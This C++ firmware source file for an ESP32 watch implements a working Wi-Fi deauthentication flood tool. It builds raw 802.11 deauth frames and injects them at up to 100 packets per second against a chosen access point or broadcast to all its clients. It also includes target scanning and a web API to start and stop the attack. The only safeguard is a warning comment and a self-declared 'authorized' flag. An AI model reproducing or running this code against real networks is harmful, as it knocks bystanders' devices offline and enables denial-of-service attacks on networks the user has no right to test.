/**
 * @file      web_tool_deauthflood.cpp
 * @brief     Authorized 802.11 deauthentication test against a selected AP/station.
 *
 * WARNING: denial-of-service testing only on networks you own or have explicit
 * permission to test. Starting it disconnects the watch's normal Wi-Fi link.
 */
#include "web_tools.h"

#if FACTORY_WEB

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <vector>
#include <mutex>

#ifdef ARDUINO
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#endif

#define DEAUTH_RADIO_OWNER "Deauth Flood"
#define DEAUTH_FRAME_SIZE 26

static bool s_active = false;
static char s_target_bssid[18] = "";
static char s_target_station[18] = "ff:ff:ff:ff:ff:ff";
static char s_target_ssid[33] = "";
static int s_channel = 1;
static int s_rate_pps = 10;
static uint32_t s_sent = 0, s_tx_errors = 0;
static long long s_started = 0;
static uint32_t s_last_send_ms = 0, s_rate_fraction = 0;
static char s_error[160] = "";
#ifdef ARDUINO
static bool s_reconnect = false;
#endif

static void set_error(const char *text)
{
    snprintf(s_error, sizeof(s_error), "%s", text ? text : "");
}

static bool mac_parse(const char *s, uint8_t mac[6])
{
    if (!s || strlen(s) != 17) return false;
    int v[6], used = 0;
    if (sscanf(s, "%x:%x:%x:%x:%x:%x%n", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5], &used) != 6 || used != 17)
        return false;
    for (int i = 0; i < 6; i++) {
        if (v[i] < 0 || v[i] > 255) return false;
        mac[i] = (uint8_t)v[i];
    }
    return true;
}

static void mac_text(const uint8_t mac[6], char out[18])
{
    snprintf(out, 18, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static void build_deauth(uint8_t *frame, const uint8_t *dst, const uint8_t *src, uint16_t reason)
{
    memset(frame, 0, DEAUTH_FRAME_SIZE);
    frame[0] = 0xc0;
    memcpy(frame + 4, dst, 6);
    memcpy(frame + 10, src, 6);
    memcpy(frame + 16, src, 6);
    frame[24] = reason & 0xff;
    frame[25] = reason >> 8;
}

#ifdef ARDUINO
static void send_one(const uint8_t dst[6], const uint8_t src[6])
{
    uint8_t frame[DEAUTH_FRAME_SIZE];
    build_deauth(frame, dst, src, 0x07);
    frame[22] = s_sent & 0xff;
    frame[23] = (s_sent >> 8) & 0xff;
    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    if (rc == ESP_OK) s_sent++;
    else {
        s_tx_errors++;
        if (s_tx_errors == 1 || s_tx_errors % 20 == 0) {
            char b[80];
            snprintf(b, sizeof(b), "Frame injection failed: %s", esp_err_to_name(rc));
            set_error(b);
        }
    }
}

static void send_cycle(void)
{
    uint8_t bssid[6], station[6];
    if (!mac_parse(s_target_bssid, bssid)) return;
    static const uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    if (strcmp(s_target_station, "ff:ff:ff:ff:ff:ff") && mac_parse(s_target_station, station)) {
        send_one(station, bssid);
        send_one(bssid, station);
    } else {
        send_one(bcast, bssid);
    }
}
#endif

/* ---------------------------------------------------------------- target scan (asynchronous) */

static std::vector<web_hw_wifi_t> s_scan_targets;
static std::mutex s_scan_mx;
static bool s_scan_running = false;
static char s_scan_error[96] = "";

static void scan_task(void *)
{
    std::vector<web_hw_wifi_t> aps;
    bool ok = web_hw_wifi_scan(aps);
    {
        std::lock_guard<std::mutex> lk(s_scan_mx);
        if (ok) s_scan_targets = aps;
        s_scan_running = false;
        snprintf(s_scan_error, sizeof(s_scan_error), "%s", ok ? "" : "Wi-Fi scan failed; try again");
    }
    tools_wifi_release(DEAUTH_RADIO_OWNER);
}

static int begin_scan(std::string &error)
{
    if (s_active) { error = "Stop Deauth Flood before scanning"; return 409; }
    {
        std::lock_guard<std::mutex> lk(s_scan_mx);
        if (s_scan_running) return 0;               /* join the scan in progress */
    }
    if (!tools_wifi_claim(DEAUTH_RADIO_OWNER, error)) return 503;
    {
        std::lock_guard<std::mutex> lk(s_scan_mx);
        s_scan_running = true;
        s_scan_error[0] = 0;
    }
    web_plat_spawn(scan_task, NULL);
    return 0;
}

/* ---------------------------------------------------------------- lifecycle */

static int begin_flood(const char *bssid_text, const char *station_text, int channel, int rate)
{
    if (s_active) { set_error("Deauth test already running"); return 409; }
    uint8_t bssid[6], station[6];
    if (!mac_parse(bssid_text, bssid)) { set_error("BSSID must be six hex octets (aa:bb:cc:dd:ee:ff)"); return 400; }
    const char *station_in = station_text && *station_text ? station_text : "ff:ff:ff:ff:ff:ff";
    if (!mac_parse(station_in, station)) { set_error("Station must be a MAC address or ff:ff:ff:ff:ff:ff"); return 400; }
    if (channel < 1 || channel > 13) { set_error("Channel must be 1-13"); return 400; }
    if (rate < 1 || rate > 100) { set_error("Rate must be 1-100 packets/s"); return 400; }

    std::string radio_error;
    if (!tools_wifi_claim(DEAUTH_RADIO_OWNER, radio_error)) { set_error(radio_error.c_str()); return 503; }
    set_error("");
    mac_text(bssid, s_target_bssid);
    mac_text(station, s_target_station);
    s_target_ssid[0] = 0;
    {
        std::lock_guard<std::mutex> lk(s_scan_mx);
        for (const auto &ap : s_scan_targets) {
            if (!strcasecmp(ap.bssid, s_target_bssid)) {
                snprintf(s_target_ssid, sizeof(s_target_ssid), "%s", ap.ssid);
                break;
            }
        }
    }
    s_channel = channel;
    s_rate_pps = rate;
    s_sent = s_tx_errors = 0;
    s_started = tools_epoch();
    s_last_send_ms = 0;
    s_rate_fraction = 0;

#ifdef ARDUINO
    s_reconnect = WiFi.status() == WL_CONNECTED;
    WiFi.disconnect(false, false);
    esp_wifi_set_promiscuous(false);
    esp_err_t rc = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (rc != ESP_OK) {
        tools_wifi_release(DEAUTH_RADIO_OWNER);
        if (s_reconnect) WiFi.reconnect();
        set_error("Wi-Fi could not select the target channel");
        return 500;
    }
#endif
    s_active = true;
    return 0;
}

static void finish_flood(void)
{
    if (!s_active) return;
    s_active = false;
    tools_wifi_release(DEAUTH_RADIO_OWNER);
#ifdef ARDUINO
    if (s_reconnect) WiFi.reconnect();
    s_reconnect = false;
#endif
}

/* ---------------------------------------------------------------- API */

static const char *const APPS[] = { "Deauth Flood", NULL };

static void status_json(web_req_t *r)
{
    std::string j = std::string("{\"active\":") + (s_active ? "true" : "false") +
        ",\"targetBssid\":";
    web_json_str(j, s_target_bssid);
    j += ",\"targetStation\":";
    web_json_str(j, s_target_station);
    j += ",\"targetSsid\":";
    web_json_str(j, s_target_ssid);
    j += ",\"channel\":" + tools_int(s_channel) +
        ",\"sent\":" + tools_int(s_sent) +
        ",\"txErrors\":" + tools_int(s_tx_errors) +
        ",\"ratePps\":" + tools_int(s_rate_pps) +
        ",\"started\":" + tools_int(s_started) + ",\"error\":";
    if (s_error[0]) web_json_str(j, s_error); else j += "null";
    j += "}";
    web_resp_json(r, 200, j);
}

static void start_flood(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    std::string body, bssid, station;
    double channel = 1, rate = 10;
    if (!tools_read_json(r, body)) return;
    web_json_get_str(body, "bssid", bssid);
    web_json_get_str(body, "station", station);
    if (web_json_has(body, "channel") && !web_json_get_num(body, "channel", &channel)) {
        web_resp_error(r, 400, "bad_request", "channel must be a number"); return;
    }
    if (web_json_has(body, "rate") && !web_json_get_num(body, "rate", &rate)) {
        web_resp_error(r, 400, "bad_request", "rate must be a number"); return;
    }
    bool approved = false;
    if (!web_json_get_bool(body, "authorized", &approved) || !approved) {
        web_resp_error(r, 400, "authorization_required", "Confirm that you own or may test this network"); return;
    }
    int rc = begin_flood(bssid.c_str(), station.c_str(), (int)channel, (int)rate);
    if (rc) web_resp_error(r, rc, rc == 400 ? "bad_request" : rc == 409 ? "conflict" : rc == 503 ? "busy" : "internal", s_error);
    else web_resp_ok(r);
}

static void stop_flood(web_req_t *r)
{
    finish_flood();
    web_resp_ok(r);
}

static void scan_targets(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    std::string error;
    int rc = begin_scan(error);
    if (rc) web_resp_error(r, rc, rc == 409 ? "conflict" : "busy", error.c_str());
    else web_resp_json(r, 202, "{\"ok\":true}");
}

static void list_targets(web_req_t *r)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    std::string j = std::string("{\"scanning\":") + (s_scan_running ? "true" : "false") + ",\"error\":";
    if (s_scan_error[0]) web_json_str(j, s_scan_error); else j += "null";
    j += ",\"targets\":[";
    for (size_t i = 0; i < s_scan_targets.size(); i++) {
        if (i) j += ",";
        j += "{\"ssid\":";
        web_json_str(j, s_scan_targets[i].ssid);
        j += ",\"bssid\":";
        web_json_str(j, s_scan_targets[i].bssid);
        j += ",\"channel\":" + tools_int(s_scan_targets[i].channel) +
            ",\"rssi\":" + tools_int(s_scan_targets[i].rssi) + ",\"auth\":";
        web_json_str(j, s_scan_targets[i].auth ? s_scan_targets[i].auth : "other");
        j += "}";
    }
    j += "]}";
    web_resp_json(r, 200, j);
}

static bool handle(web_req_t *r)
{
#ifndef ARDUINO
    if (tools_is(r, "POST", "/api/_dev/deauthflood")) {
        std::string body;
        if (!tools_read_json(r, body)) return true;
        int rc = begin_flood("02:00:00:00:00:01", "ff:ff:ff:ff:ff:ff", 1, 10);
        if (rc) web_resp_error(r, rc, rc == 503 ? "busy" : "conflict", s_error);
        else web_resp_ok(r);
        return true;
    }
#endif
    if (strcmp(r->path, "/api/deauthflood") && strncmp(r->path, "/api/deauthflood/", 17)) return false;
    if (tools_is(r, "GET", "/api/deauthflood")) status_json(r);
    else if (tools_is(r, "POST", "/api/deauthflood/start")) start_flood(r);
    else if (tools_is(r, "POST", "/api/deauthflood/stop")) stop_flood(r);
    else if (tools_is(r, "POST", "/api/deauthflood/scan")) scan_targets(r);
    else if (tools_is(r, "GET", "/api/deauthflood/targets")) list_targets(r);
    else web_resp_error(r, 404, "not_found");
    return true;
}

static void deauth_tick(uint32_t now_ms)
{
    if (!s_active) return;
#ifdef ARDUINO
    if (!s_last_send_ms) s_last_send_ms = now_ms;
    uint32_t elapsed = now_ms - s_last_send_ms;
    if (elapsed < 50) return;
    s_last_send_ms = now_ms;
    if (elapsed > 250) elapsed = 250;             /* no unbounded burst after a blocked UI loop */
    s_rate_fraction += elapsed * (uint32_t)s_rate_pps;
    int cycles = 0;
    while (s_rate_fraction >= 1000 && cycles++ < 25) {
        s_rate_fraction -= 1000;
        send_cycle();
    }
#else
    (void)now_ms;
    s_sent += s_rate_pps / 20 + 1;
#endif
}

static void deauth_stop(void) { finish_flood(); }

bool web_hw_deauthflood_start(const char *bssid, const char *station, int channel, int rate)
{
    return begin_flood(bssid, station, channel, rate) == 0;
}
bool web_hw_deauthflood_stop(void) { finish_flood(); return true; }
void web_hw_deauthflood_status(web_hw_deauthflood_t *out)
{
    if (!out) return;
    memset(out, 0, sizeof(*out));
    out->active = s_active;
    snprintf(out->target_bssid, sizeof(out->target_bssid), "%s", s_target_bssid);
    snprintf(out->target_station, sizeof(out->target_station), "%s", s_target_station);
    snprintf(out->target_ssid, sizeof(out->target_ssid), "%s", s_target_ssid);
    out->channel = s_channel;
    out->sent_count = s_sent;
    out->rate_kbps = (uint32_t)s_rate_pps;       /* legacy field name; value is packets/s */
    out->started_epoch = s_started;
    out->error = s_error[0] ? s_error : NULL;
}
int web_hw_deauthflood_scan_targets(void)
{
    std::string error;
    begin_scan(error);
    return web_hw_deauthflood_target_count();
}
bool web_hw_deauthflood_scanning(void)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return s_scan_running;
}
int web_hw_deauthflood_target_count(void)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return (int)s_scan_targets.size();
}
const char *web_hw_deauthflood_target_ssid(int i)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return i >= 0 && i < (int)s_scan_targets.size() ? s_scan_targets[i].ssid : "";
}
const char *web_hw_deauthflood_target_bssid(int i)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return i >= 0 && i < (int)s_scan_targets.size() ? s_scan_targets[i].bssid : "";
}
int web_hw_deauthflood_target_channel(int i)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return i >= 0 && i < (int)s_scan_targets.size() ? s_scan_targets[i].channel : 0;
}
int web_hw_deauthflood_target_rssi(int i)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return i >= 0 && i < (int)s_scan_targets.size() ? s_scan_targets[i].rssi : 0;
}
const char *web_hw_deauthflood_target_auth(int i)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return i >= 0 && i < (int)s_scan_targets.size() && s_scan_targets[i].auth ? s_scan_targets[i].auth : "other";
}

static const char *const CAPS[] = { "deauth.flood", NULL };
const web_tool_t web_tool_deauthflood = { CAPS, handle, deauth_tick, NULL, deauth_stop };

#else
const web_tool_t web_tool_deauthflood = { NULL, NULL, NULL, NULL, NULL };
#endif
